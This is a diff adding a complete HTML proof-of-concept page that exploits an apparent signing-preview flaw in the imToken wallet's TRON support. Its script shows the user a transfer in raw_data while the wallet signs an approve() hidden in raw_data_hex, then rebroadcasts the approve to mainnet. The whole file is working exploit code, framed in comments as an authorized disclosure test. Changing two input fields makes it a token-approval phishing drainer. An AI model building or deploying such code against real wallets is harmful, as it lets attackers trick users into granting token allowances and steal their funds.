@@ -1,0 +1,304 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TRON sendTransaction preview mismatch PoC</title>
+  </head>
+  <body>
+    <input id="previewRecipient" value="T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb" />
+    <input id="previewAmount" value="10000" />
+    <input id="tokenContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
+    <input id="spender" placeholder="defaults to current address" />
+    <input id="approveAmount" value="1" />
+    <input id="rpcUrl" value="https://api.trongrid.io" />
+    <select id="mode">
+      <option value="signAndRebroadcast">Mode B: sign-only + rebroadcast consistent approve (lands on-chain)</option>
+      <option value="sendTransaction">Mode A: tron.sendTransaction (reproduces SIGERROR)</option>
+    </select>
+    <button id="runBtn">Run PoC</button>
+    <pre id="status"></pre>
+    <pre id="previewTx"></pre>
+    <pre id="approveTx"></pre>
+
+    <script>
+      const $ = (id) => document.getElementById(id);
+      const statusEl = $('status');
+      const previewEl = $('previewTx');
+      const approveEl = $('approveTx');
+      const runBtn = $('runBtn');
+
+      function setStatus(value) {
+        statusEl.textContent = value;
+      }
+
+      function safeStringify(value) {
+        return JSON.stringify(value, null, 2);
+      }
+
+      function getCurrentAccount() {
+        const account = window.tronWeb?.defaultAddress?.base58;
+        if (!account) {
+          throw new Error('No TRON account detected. Please open this page inside imToken with a TRON wallet selected.');
+        }
+        return account;
+      }
+
+      async function postJson(url, body) {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status} from ${url}`);
+        }
+        return await response.json();
+      }
+
+      function normalizeRpcUrl() {
+        const uiValue = $('rpcUrl').value.trim();
+        const providerValue = window.tronWeb?.fullNode?.host;
+        return (uiValue || providerValue || 'https://api.trongrid.io').replace(/\/$/, '');
+      }
+
+      function encodeApproveParams(spender, amount) {
+        const spenderHex = window.tronWeb.address
+          .toHex(spender)
+          .replace(/^41/, '')
+          .padStart(64, '0');
+        const amountHex = BigInt(amount).toString(16).padStart(64, '0');
+        return spenderHex + amountHex;
+      }
+
+      async function buildPreviewTransfer(from) {
+        const rpc = normalizeRpcUrl();
+        const result = await postJson(`${rpc}/wallet/createtransaction`, {
+          owner_address: from,
+          to_address: $('previewRecipient').value.trim(),
+          amount: Number($('previewAmount').value.trim()),
+          visible: true,
+        });
+        if (result.Error) {
+          throw new Error(`createtransaction failed: ${result.Error}`);
+        }
+        return result;
+      }
+
+      async function buildApprove(from, spender) {
+        const rpc = normalizeRpcUrl();
+        const result = await postJson(`${rpc}/wallet/triggersmartcontract`, {
+          owner_address: from,
+          contract_address: $('tokenContract').value.trim(),
+          function_selector: 'approve(address,uint256)',
+          parameter: encodeApproveParams(spender, $('approveAmount').value.trim()),
+          fee_limit: 100000000,
+          call_value: 0,
+          visible: true,
+        });
+        if (!result?.result?.result || !result?.transaction?.raw_data_hex) {
+          throw new Error(`triggersmartcontract failed: ${safeStringify(result)}`);
+        }
+        return result;
+      }
+
+      // Root cause (authorized test): tron.sendTransaction does not enforce
+      // consistency between tx.raw_data (used to render the preview) and
+      // tx.raw_data_hex (used by the signer). Preview source != sign source.
+      //   raw_data      -> TransferContract        (what the user sees)
+      //   raw_data_hex  -> TriggerSmartContract     (what is actually signed)
+      //   txID          -> follows raw_data_hex so the broadcast is self-consistent
+      function buildMismatchedTx(previewTransfer, approveTx) {
+        return {
+          ...approveTx.transaction,
+          raw_data: previewTransfer.raw_data,
+          raw_data_hex: approveTx.transaction.raw_data_hex,
+          txID: approveTx.transaction.txID,
+        };
+      }
+
+      function describeContract(rawData) {
+        const contract = rawData?.contract?.[0] ?? {};
+        const value = contract.parameter?.value ?? {};
+        return {
+          type: contract.type,
+          owner_address: value.owner_address,
+          to_address: value.to_address,
+          contract_address: value.contract_address,
+          amount: value.amount,
+          data_selector: value.data ? value.data.slice(0, 8) : undefined,
+        };
+      }
+
+      function findSignature(value) {
+        const sig =
+          value?.signature ??
+          value?.tx?.signature ??
+          value?.transaction?.signature ??
+          value?.result?.signature ??
+          value?.signedTransaction?.signature;
+        if (!sig) return null;
+        return Array.isArray(sig) ? sig : [sig];
+      }
+
+      // imToken's sign path differs from the vulnerable sendTransaction path.
+      // Probe every plausible "sign only" entry point and log each raw result,
+      // so we can find one that returns a signature over tx.raw_data_hex.
+      async function signMismatch(account, tx) {
+        const attempts = [
+          {
+            name: 'tronWeb.trx.sign(tx)',
+            run: () => window.tronWeb?.trx?.sign?.(tx),
+            available: () => !!window.tronWeb?.trx?.sign,
+          },
+          {
+            name: "imToken.callPromisifyAPI('tron.signTransaction')",
+            run: () =>
+              window.imToken?.callPromisifyAPI?.('tron.signTransaction', {
+                from: account,
+                tx,
+                useTronHeader: true,
+              }),
+            available: () => !!window.imToken?.callPromisifyAPI,
+          },
+          {
+            name: "tron.request('tron_signTransaction')",
+            run: () => window.tron?.request?.({ method: 'tron_signTransaction', params: [tx] }),
+            available: () => !!window.tron?.request,
+          },
+        ];
+
+        const log = [];
+        for (const attempt of attempts) {
+          if (!attempt.available()) {
+            log.push(`[skip] ${attempt.name}: not available`);
+            continue;
+          }
+          try {
+            const result = await attempt.run();
+            const signature = findSignature(result);
+            log.push(`[ok] ${attempt.name} -> ${safeStringify(result)}`);
+            if (signature) {
+              return { signature, log };
+            }
+          } catch (error) {
+            log.push(`[err] ${attempt.name}: ${error?.message || String(error)}`);
+          }
+        }
+        return { signature: null, log };
+      }
+
+      // Re-broadcast with raw_data == approve so it is CONSISTENT with the
+      // signature the wallet produced over raw_data_hex (approve). The node
+      // builds the tx from raw_data only, so this passes signature validation.
+      async function broadcastConsistentApprove(approveTx, signature) {
+        const rpc = normalizeRpcUrl();
+        return await postJson(`${rpc}/wallet/broadcasttransaction`, {
+          visible: true,
+          txID: approveTx.transaction.txID,
+          raw_data: approveTx.transaction.raw_data,
+          raw_data_hex: approveTx.transaction.raw_data_hex,
+          signature,
+        });
+      }
+
+      async function run() {
+        runBtn.disabled = true;
+        try {
+          const account = getCurrentAccount();
+          const spender = $('spender').value.trim() || account;
+
+          const previewTransfer = await buildPreviewTransfer(account);
+          previewEl.textContent = safeStringify(previewTransfer.raw_data);
+
+          const approveTx = await buildApprove(account, spender);
+          const approveData = approveTx.transaction.raw_data.contract[0].parameter.value.data;
+          approveEl.textContent = safeStringify({
+            txID: approveTx.transaction.txID,
+            raw_data_hex: approveTx.transaction.raw_data_hex,
+            selector: approveData.slice(0, 8),
+            approve_data: approveData,
+          });
+
+          if (approveData.slice(0, 8).toLowerCase() !== '095ea7b3') {
+            throw new Error(`Unexpected approve selector: ${approveData.slice(0, 8)}`);
+          }
+
+          const tx = buildMismatchedTx(previewTransfer, approveTx);
+          const mode = $('mode').value;
+
+          setStatus(
+            [
+              `Mode: ${mode}`,
+              '--- Wallet WILL DISPLAY (parsed from tx.raw_data) ---',
+              safeStringify(describeContract(tx.raw_data)),
+              '--- Wallet WILL SIGN (tx.raw_data_hex, decoded approve) ---',
+              safeStringify(describeContract(approveTx.transaction.raw_data)),
+            ].join('\n')
+          );
+
+          if (mode === 'sendTransaction') {
+            // Reproduces the SIGERROR: wallet broadcasts raw_data (transfer)
+            // together with a signature over raw_data_hex (approve). The node
+            // validates against raw_data, so signature recovery yields a wrong
+            // address -> "not contained of permission".
+            if (!window.imToken?.callPromisifyAPI) {
+              throw new Error('window.imToken.callPromisifyAPI is unavailable. Please use imToken dapp browser.');
+            }
+            const result = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+              from: account,
+              tx,
+              useTronHeader: true,
+            });
+            setStatus(
+              [
+                'sendTransaction returned (expected to fail with SIGERROR):',
+                safeStringify(result),
+              ].join('\n')
+            );
+            return;
+          }
+
+          // Mode B: ask wallet to sign only (it shows transfer, signs approve),
+          // then rebroadcast a CONSISTENT approve so the node accepts it.
+          const { signature, log } = await signMismatch(account, tx);
+
+          if (!signature) {
+            setStatus(
+              [
+                'No signature returned by any sign API. Probe log:',
+                ...log,
+                '',
+                'Paste this log back so we can identify the right sign entry point.',
+              ].join('\n')
+            );
+            return;
+          }
+
+          const broadcast = await broadcastConsistentApprove(approveTx, signature);
+
+          setStatus(
+            [
+              'Signed under a TransferContract preview, broadcast as approve.',
+              ...log,
+              `approve txID: ${approveTx.transaction.txID}`,
+              `signature: ${safeStringify(signature)}`,
+              `broadcast result: ${safeStringify(broadcast)}`,
+              '',
+              broadcast?.result === true || broadcast?.code === 'SUCCESS'
+                ? 'WYSIWYS BROKEN: an approve landed while the user saw a transfer.'
+                : 'Broadcast not accepted; inspect result above.',
+            ].join('\n')
+          );
+        } catch (error) {
+          console.error(error);
+          setStatus(`Error: ${error.message || String(error)}`);
+        } finally {
+          runBtn.disabled = false;
+        }
+      }
+
+      runBtn.addEventListener('click', run);
+    </script>
+  </body>
+</html>
